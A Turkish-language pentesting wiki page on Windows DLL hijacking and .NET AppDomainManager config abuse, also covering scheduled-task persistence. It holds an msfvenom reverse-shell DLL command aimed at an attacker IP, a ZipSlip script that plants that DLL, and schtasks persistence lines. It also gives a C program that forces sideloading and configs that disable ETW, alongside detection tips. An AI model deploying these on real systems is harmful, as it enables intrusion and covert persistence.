# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde yönlendirilmesini içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Temel olarak kod yürütme ve kalıcılık sağlamak, daha nadiren de ayrıcalık yükseltme amacıyla kullanılır. Burada ayrıcalık yükseltmeye odaklanılsa da hijacking yöntemi, hedef ne olursa olsun aynı kalır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır; her birinin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı olanla değiştirmek; isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi arama yolunda meşru DLL'den önce gelecek şekilde yerleştirerek uygulamanın arama düzeninden yararlanmak.
3. **Phantom DLL Hijacking**: Uygulamanın var olmayan, gerekli bir DLL olduğunu düşünerek yükleyeceği kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Genellikle DLL side-loading ile ilişkilendirilen bu yöntemde, WinSxS dizinindeki meşru DLL'yi kötü amaçlı bir benzeriyle değiştirmek.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi, kopyalanmış uygulamayla birlikte kullanıcı tarafından denetlenebilen bir dizine yerleştirmek; bu yöntem Binary Proxy Execution tekniklerine benzer.

Bir uygulama **kendi DLL loader'ını** da uygulayabilir. Ayrıcalıklı bir işlem, `Libraries` veya `Plugins` gibi bir alt dizini numaralandırıp seçilen bir DLL'yi yardımcı programa iletebilir; bu işlem normal Windows DLL arama sırasından bağımsızdır. Başka bir hesap bu dizinde dosya oluşturabiliyorsa, bunu inceleme için bir ipucu olarak değerlendirin: işlem kimliğini, dizinin etkin ACL'sini, dosya seçme kuralını ve erişilebilir bir yükleme işlemini doğrulayın. Bir yürütülebilir dosyanın yanındaki yazılabilir bir dizin, işlemin DLL'leri bu dizinden yüklediğini kanıtlamaz.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Kurulum sonrası PE import grafting

Klasik side-loading, güvenilir PE dosyasını değiştirmeden bırakır ve DLL ad çözümlemesini ele geçirir. **Import grafting** ise güvenilir program tarafından zaten yüklenmiş bir PE dosyasını değiştirir. Saldırgan, saldırganın denetimindeki bir DLL için bir import tanımlayıcısı ve ilişkili arama/IAT girdileri ekler. Windows bu bağımlılığı özyinelemeli olarak çözümlerken eklenen DLL'yi belleğe eşler ve başlatma kodunu, aksi hâlde meşru olan işlemin içinde çalıştırır. Bu, diskteki bir PE dosyasının değiştirilmesidir; canlı bir IAT işlev işaretçisinin çalışma zamanı hook'u ile değiştirilmesiyle aynı işlem değildir.<sup>[[31]](#references)[[32]](#references)</sup>

Değiştirilen PE, kullanıcının veya Task Scheduler'ın başlattığı yürütülebilir dosya yerine ara bir vendor DLL'si olabilir. Yeniden kullanılabilir bir zincir şöyledir:<sup>[[32]](#references)</sup>

1. Meşru yürütülebilir dosyayı ve bağımlılıklarını saldırganın denetimindeki bir dizine kopyalayın.
2. Bağımlılıklardan birinin import yapılarını, beklenen export'larını ve normal davranışını koruyarak kötü amaçlı DLL'ye başvuracak şekilde yamalayın.
3. Meşru yürütülebilir dosyayı başlatmak için bir autorun veya scheduled task yapılandırın. Loader, değiştirilmiş bağımlılığı ve ardından yeni import edilen DLL'yi belleğe eşler. Görevleri numaralandırmak için [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) sayfasına bakın.
4. Maliyetli işlemleri `DllMain` dışında tutun; gözlemlenen loader bir worker thread oluşturup aşamalı şifre çözme işlemine orada devam etti.

Vendor paketi temizken ve import değişikliği kurulumdan sonra yapıldığında, bu durum vendor tarafındaki bir supply-chain compromise'dan farklıdır. Yalnızca host EXE'yi değil, aşamalı dizindeki her modülü inceleyin: bağımlılıkların import listelerini ve hash'lerini temiz bir kurulumdaki değerlerle karşılaştırın, imzaları doğrulayın ve `C:\ProgramData` gibi beklenmedik yazılabilir konumlardan başlatılan vendor ikililerini araştırın. Böyle bir dizindeki kopyalanmış bir crash reporter veya updater'ı işaret eden scheduled task, özellikle yararlı bir pivot noktasıdır.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + saldırgan assembly'si)

Klasik DLL sideloading, güvenilir bir **.NET Framework** işleminin saldırgan kodu yüklemesini sağlamanın tek yolu değildir. Hedef yürütülebilir dosya **managed** bir uygulamaysa, CLR ayrıca yürütülebilir dosyanın adını taşıyan bir **uygulama yapılandırma dosyasına** da bakar (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Yapılandırma, EXE'nin yanına yerleştirilmiş saldırganın denetimindeki bir assembly'yi gösteriyorsa CLR, uygulamanın normal kod yolundan **önce** bu assembly'yi yükler ve güvenilir işlemin içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework yapılandırma şemasına göre özel manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` bulunmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

Minimum yapılandırma:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimal yönetici:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Pratik notlar:
- Bu **.NET Framework'e özgü** bir tradecraft'tir. Win32 DLL arama sırasına değil, CLR yapılandırma ayrıştırmasına dayanır.
- Host gerçekten **managed bir EXE** olmalıdır. Hızlı triage için: `sigcheck -m target.exe`, `corflags target.exe` komutlarını çalıştırın veya PE metadata'sında **CLR Runtime Header** olup olmadığını kontrol edin.
- Yapılandırma dosyasının adı yürütülebilir dosyanın adıyla tam olarak eşleşmeli (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunmalıdır.
- Bu yöntem **imzalı Microsoft/vendor binary'leriyle** kullanışlıdır; çünkü güvenilir EXE'ye dokunulmazken kötü amaçlı managed assembly süreç içinde çalışır.
- Zaten yazılabilir bir installer/update dizininiz varsa, AppDomainManager hijacking **ilk aşama** olarak kullanılabilir; sonraki aşamalarda klasik DLL sideloading veya reflective loading uygulanabilir.

### Yapılandırma dosyası gadget'ı olarak imzalı AppDomainManager türü

Yukarıdaki olağan AppDomainManager config hijack, saldırganın assembly'sini hedef gösterir. Farklı bir .NET Framework yöntemi, host'un yanında bulunan veya başka şekilde çözümlenebilen ve manager türü saldırganın denetimindeki yan dosya verilerini okuyan **imzalı bir assembly** kullanır. Saldırganın yine managed host'un bitişiğindeki `.exe.config` dosyasını ve ikincil dosyaları denetleyebilmesi gerekir; seçilen assembly'nin imzalı olması, yapılandırma girdisini güvenli hâle getirmez. Yapılandırma mekanizması yerleşik AppDomainManager davranışıdır; aşağıda açıklanan imzalı tür zincirlemesi ise NetamLoader analizinde gözlemlenmiştir.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

Bu zincirde yapılandırma, `Microsoft.HostIntegration.Connectors` içindeki `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` türünü seçer. Bu tür başlatılırken uygulama dizininde `fabric.config` dosyası aranır. Bir `customType` girdisi `System.Resources.ResXResourceSet` adını belirtir ve yapıcı argümanı olarak `Resources.resx` dosyasını vererek saldırganın oluşturduğu bir manager DLL'sini dağıtmadan bir kaynak ayrıştırıcısına ulaşır. Bunun için AppFabric ile ilgili imzalı assembly'nin ve belirtilen framework sınıflarının hedefte çözümlenebilmesi gerekir; bu, her managed EXE için geçerli olan evrensel bir özellik değildir.<sup>[[35]](#references)</sup> Yapılandırılmış bir AppDomainManager ayrıca full-trust bir uygulama gerektirir; aksi takdirde CLR `TypeLoadException` fırlatır.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

`Resources.resx` içeriği yalnızca bir veri dosyası değil, deserialization sink’idir; bkz. [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Bildirilen aşamada XAML loader, AES key’ini **küçük harfe dönüştürülmüş tam host command line** değerinin SHA-256 hash’inden türetiyor ve decoded blob’un ilk 16 byte’ını IV olarak kullanıyordu. Dosyaları farklı bir command line ile yeniden çalıştırmak, sonraki XAML yüklenmeden önce decryption işleminin başarısız olmasına neden olur.<sup>[[35]](#references)</sup>

### Downloader + scheduled-task bootstrap olarak AppDomainManager

Uygulanabilir bir saldırı modeli, güvenilir managed EXE’yi hem kötü amaçlı bir `*.config` hem de yalnızca **küçük bir bootstrapper** görevi gören kötü amaçlı bir AppDomainManager DLL’siyle eşleştirmektir:<sup>[[25]](#references)</sup>

1. Kullanıcı, `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan imzalı bir .NET installer veya updater başlatır.
2. Yanındaki config, CLR’ın saldırgan assembly’sini **meşru uygulamanın mantığı başlamadan önce** yüklemesine neden olur.
3. Kötü amaçlı manager bir **path gate** uygular (örneğin, yalnızca host EXE `Downloads` konumundan çalışıyorsa devam eder ve ikinci aşamanın yalnızca `%LOCALAPPDATA%` konumundan çalışmasına izin verir).
4. Kontrol başarılı olursa payload’ı `%LOCALAPPDATA%\PerfWatson2.exe` gibi kullanıcının yazabildiği bir konuma indirir ve scheduled task ile persistence sağlar.

Bu varyant neden önemli:
- İmzalı host EXE değişmeden kalır; bu nedenle yalnızca ana binary’nin hash’ini kontrol eden triage, ihlali gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL üçlüsünü Desktop, Temp veya bir sandbox konumuna taşımak zinciri bilerek bozabilir.
- İlk aşamadaki AppDomainManager DLL’si küçük ve düşük profilli kalırken, gerçek implant daha sonra indirilebilir.

Bu modelde sıkça görülen minimal persistence örneği:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notlar:
- ` /rl highest`, o kullanıcı/oturum için **kullanılabilir en yüksek** yetkiyi belirtir; tek başına garantili bir SYSTEM yetki yükseltmesi değildir.
- Bu teknik, klasik eksik-DLL arama sırası hijacking’inden ziyade **.NET yapılandırma kötüye kullanımı yoluyla çalıştırma/kalıcılık** olarak sınıflandırılmalıdır; ancak operatörler genellikle ikisini birlikte zincirler.

Tespit ipuçları:
- **ZIP’ten çıkarılan dizinlerden**, `Downloads`, `%TEMP%` veya kullanıcının yazabildiği diğer klasörlerden başlatılan ve yanlarında `<exe>.config` bulunan imzalı .NET yürütülebilir dosyaları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içindeki bir konumu gösteren ve adları tarayıcı/üretici güncelleyicilerini taklit eden yeni zamanlanmış görevler.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan, kısa süre çalışan yönetilen bootstrap süreçleri.
- Yürütülebilir dosyanın yolu beklenen bir kullanıcı profili diziniyle eşleşmediğinde erken çıkan örnekler.

### Sideload zincirini yeniden başlatmak için mevcut bir zamanlanmış görevi hijack etme

Kalıcılık için yalnızca **yeni bir görev oluşturulmasını** aramayın. Bazı saldırı grupları, meşru bir yükleyicinin **normal bir güncelleyici görevi** oluşturmasını bekler; ardından mevcut adın, yazarın ve tetikleyicinin savunmacılara tanıdık görünmesini sağlamak için **görev eylemini yeniden yazar**.

Yeniden kullanılabilir iş akışı:
1. Meşru yazılımı yükleyin/çalıştırın ve normalde oluşturduğu görevi belirleyin.
2. Görev XML’ini dışa aktarın ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca eylemi değiştirerek görevin, kullanıcı tarafından yazılabilir bir hazırlık dizinindeki **güvenilir ana bilgisayar EXE’nizi** başlatmasını sağlayın; bu EXE daha sonra gerçek payload’ı side-load eder veya AppDomain ile yükler.
4. Yeni ve göze çarpan bir kalıcılık öğesi oluşturmak yerine aynı görev adını yeniden kaydedin.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Neden daha gizlidir:
- Görev adı hâlâ meşru görünebilir (örneğin bir satıcı güncelleyicisi).
- **Task Scheduler hizmeti** görevi başlattığından, üst süreç/ata doğrulaması genellikle `explorer.exe` yerine beklenen zamanlama zincirini görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı zaten mevcut olan ancak eylemi artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın denetimindeki başka bir yolu gösteren bir görevi gözden kaçırabilir.

Hızlı avlanma noktaları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML dosyalarını ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` meta verilerini bir temel çizgiyle karşılaştırın.
- **Satıcıya aitmiş gibi görünen bir güncelleme görevi** **kullanıcının yazabildiği dizinlerden** çalıştığında veya yanındaki `*.config` dosyasıyla bir .NET EXE başlattığında uyarı üretin.

> [!TIP]
> HTML hazırlama, AES-CTR yapılandırmaları ve .NET implantlarını DLL sideloading üzerine katmanlayan adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Side-load edilmiş bir aşamanın hizmet komut satırına bağlanması

Side-load edilmiş bir DLL, beklenen ana EXE ve DLL adlarından fazlasını gerektirebilir. Mandiant, yükün şifresini çözmeyi bir komut satırı argümanına ve ana çalıştırılabilir dosyanın adına bağlayan bir loader'ı açıklamıştır.<sup>[[33]](#references)</sup> Daha sonraki, hizmet destekli bir zincirde kopyalanmış meşru bir ana program, `LockClrVersion` dışa aktaran ve yalnızca hizmet argümanından ve ana çalıştırılabilir dosyanın temel adından bir AES-128 anahtarı türettikten sonra gömülü aşamasının şifresini çözen yanındaki `mscoree.dll` dosyasını yüklemiştir. Her girdi 16 bayta kısaltılmış veya NUL baytlarıyla 16 bayta tamamlanmıştır; bayt bazındaki anahtar `argument XOR embedded_key XOR executable_basename` olarak oluşturulmuş, ardından yük AES-CBC ile dolgu olmadan çözülmüştür. Ana programın adını değiştirmek veya onu beklenen argüman olmadan başlatmak, DLL hâlâ yüklense bile anahtarı değiştirir ve bu aşamanın şifresinin çözülmesini engeller. Bu varyantı yeniden üretirken veya analiz ederken komut satırı argümanını ve temel adı aynen koruyun.<sup>[[34]](#references)</sup>

Bu, **sıradan DLL side-loading üzerine eklenmiş bir yük kapısıdır**; yeni bir DLL arama sırası kuralı veya tek başına bir ayrıcalık yükseltme tekniği değildir. Sonuçtaki ayrıcalık düzeyini hizmetin güvenlik bağlamı belirler. [GitHub issue/file C2 iş akışı](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) sonraki aktarımı ayrı olarak belgeler.<sup>[[34]](#references)</sup>

## Eksik DLL'leri bulma

Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aracını çalıştırıp **aşağıdaki 2 filtreyi ayarlamaktır**:

![Yaygın Teknikler - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın procmon aracını çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (961).png>)

![Yaygın Teknikler - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın procmon aracını çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **Dosya Sistemi Etkinliği**ni göstermektir:

![Yaygın Teknikler - Eksik DLL'leri bulma: yalnızca Dosya Sistemi Etkinliği'ni gösterin](<../../../images/image (153).png>)

**Genel olarak eksik DLL'leri** arıyorsanız bunu **birkaç saniye** çalışır durumda **bırakın**.\
**Belirli bir çalıştırılabilir dosyadaki eksik bir DLL'i** arıyorsanız **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, dosyayı çalıştırın ve olay yakalamayı durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'lerden yararlanma

Ayrıcalıkları yükseltmek için, **ayrıcalıklı bir sürecin yazabileceğiniz bir konumdan yüklemeye çalıştığı bir DLL'i** arayın. Bu, meşru DLL'i içeren dizinden önce aranan bir dizini denetlediğinizde veya istenen DLL mevcut olmadığında ve aranan dizinlerden birine yazabildiğinizde gerçekleşebilir.

### DLL arama sırası

**DLL'lerin nasıl yüklendiğiyle ilgili ayrıntıları [Microsoft belgelerinde](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) bulabilirsiniz.**

**Windows uygulamaları**, belirli bir sırayı izleyerek **önceden tanımlanmış arama yollarında** DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilip gerçek DLL'den önce yüklenmesiyle ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda **32-bit** sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir işlev yoktur, ancak dizin aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın.
   1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun **App Paths** kayıt defteri anahtarında belirtilen uygulama başına yol bilgisini içermediğini unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **varsayılan** arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturup 0 olarak ayarlayın (varsayılan olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün bulunduğu dizinde başlar.

Son olarak, DLL adı yerine mutlak yolu kullanılarak yüklenebilir. Bu durumda Windows, DLL'in kendisini yalnızca belirtilen yolda arar; adıyla istenen bağımlılıklar yine geçerli arama sırasını izler.

Arama sırasını değiştirmenin başka yolları da var, ancak bunları burada açıklamayacağım.

### Rastgele dosya yazma yeteneğini eksik DLL hijack'ine dönüştürme

**İlgili teknik:** [ayrıcalıklı düzeltme işlemine karşı oplock ile denetlenen mount-point geçişi](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Sürecin arayıp bulamadığı DLL adlarını toplamak için **ProcMon** filtrelerini (`Process Name` = hedef EXE, `Path` `.dll` ile biter, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. İkili dosya bir **zamanlama/hizmet** üzerinden çalışıyorsa bu adlardan birine sahip bir DLL'i **uygulama dizinine** (arama sırasındaki #1 girdisi) bırakmak, dosyanın bir sonraki çalıştırmada yüklenmesini sağlar. Bir .NET tarayıcı örneğinde süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` dosyasını arıyordu.
3. Herhangi bir dışa aktarımı olan bir yük DLL'i (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. İlkel yeteneğiniz **ZipSlip tarzı rastgele yazma** ise DLL'in uygulama klasörüne düşmesi için çıkarma dizininin dışına çıkan bir ZIP girdisi hazırlayın:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Arşivi izlenen gelen kutusuna/paylaşıma bırakın; zamanlanmış görev süreci yeniden başlattığında kötü amaçlı DLL yüklenir ve kodunuz hizmet hesabı olarak çalıştırılır.

### RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla sideloading'i zorlama

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in yerel API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırganın denetimindeki bir dizini vererek, içe aktarılan bir DLL’yi ada göre çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef sürecin bu dizindeki kötü amaçlı DLL’yi yüklemesi sağlanabilir.

Temel fikir
- RtlCreateProcessParametersEx ile süreç parametrelerini oluşturun ve denetiminizdeki klasörü (ör. dropper/unpacker dosyanızın bulunduğu dizin) gösteren özel bir DllPath belirtin.
- RtlCreateUserProcess ile süreci oluşturun. Hedef ikili dosya bir DLL’yi ada göre çözdüğünde, yükleyici çözümleme sırasında sağlanan DllPath’e başvurur; böylece kötü amaçlı DLL hedef EXE ile aynı dizinde olmasa bile güvenilir sideloading sağlanır.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; yalnızca geçerli süreci etkileyen SetDllDirectory’den farklıdır.
- Hedef, bir DLL’yi ada göre içe aktarmalı veya LoadLibrary ile yüklemelidir (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve sabit kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS, öncelik sırasını değiştirebilir.

En küçük C örneği (ntdll, geniş karakter dizeleri, basitleştirilmiş hata işleme):

<details>
<summary>Eksiksiz C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla DLL sideloading'i zorlama</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'e proxy olarak yönlendiren kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını adına göre aradığı bilinen imzalı bir binary başlatın. Loader, import'u belirtilen DllPath üzerinden çözümler ve DLL'inizi sideload eder.

Bu tekniğin sahada, çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: ilk başlatıcı bir yardımcı DLL bırakır; bu DLL de özel bir DllPath ile Microsoft tarafından imzalanmış, hijack edilebilir bir binary başlatarak saldırganın DLL'inin bir staging dizininden yüklenmesini sağlar.<sup>[[6]](#references)</sup>


### `.exe.config` üzerinden .NET AppDomainManager hijacking

**.NET Framework** hedeflerinde, uygulamanın yanındaki **`.exe.config`** dosyasını kötüye kullanarak belleğe yama uygulamadan **`Main()` öncesinde** sideloading yapılabilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyasının ve saldırganın kontrolündeki bir veya daha fazla assembly'nin yanına yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Ana EXE başlar ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlayarak runtime'ın saldırganın kontrolündeki bir `AppDomainManager` örneği oluşturmasını sağlar.
3. Kötü amaçlı manager, güvenilir host process içinde **`Main()` öncesinde kod yürütür**.
4. Aynı config, CLR'ı önce yerel assembly'leri (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) çözümlemeye zorlayabilir ve inline yama uygulamadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Kampanya tarzı örüntü (tam iç içe yerleşim, yönergeye / CLR sürümüne göre değişebilir):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Neden kullanışlı:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, meşru uygulama mantığı çalışmadan önce, CLR başlatılırken yürütmeyi saldırganın koduna yönlendirir.<sup>[[16]](#references)[[17]](#references)</sup>
